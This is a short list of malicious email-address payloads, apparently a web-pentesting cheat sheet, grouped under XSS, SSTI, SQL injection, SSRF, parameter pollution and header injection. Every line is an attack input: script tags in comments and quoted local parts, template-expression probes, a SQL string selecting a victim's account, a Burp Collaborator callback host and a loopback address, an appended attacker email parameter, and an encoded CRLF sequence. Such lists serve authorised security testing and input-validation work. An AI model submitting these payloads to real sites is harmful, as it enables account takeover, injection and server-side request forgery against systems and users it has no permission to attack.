## XSS
test+(<script>alert(0)</script>)@example.com
test@example(<script>alert(0)</script>).com
"<script>alert(0)</script>"@example.com

## SSTI
"<%= 7*7 %>"@example.com
test+(${{7*7}})@example.com

## SQLi
"' OR email='victim@company.com'--'"@example.com

## SSRF
john.doe@abc123.burpcollaborator.net
john.doe@[127.0.0.1]

## Parameter Pollution
victim&email=attacker@example.com

## Header Injection
"%0d%0aContent-Length"
